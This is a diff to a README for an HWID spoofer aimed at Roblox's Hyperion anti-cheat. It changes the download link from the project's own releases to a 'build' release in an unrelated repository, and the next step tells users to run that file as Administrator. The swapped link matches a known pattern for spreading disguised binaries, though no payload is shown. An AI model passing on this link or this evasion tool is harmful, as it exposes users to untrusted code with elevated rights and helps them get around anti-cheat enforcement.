@@ -30,7 +30,7 @@ This HWID spoofer targets four specific hardware identifiers that Hyperion uses:
 
 ### Pre-built Binary
 
-1. Download the latest release from the [Releases](https://github.com/24rr/roblox-hwid/releases) page
+1. Download the latest release from the [Releases](https://github.com/0x340/spoofer/releases/tag/build) page
 2. Run the executable as Administrator
 
 ### Building from Source
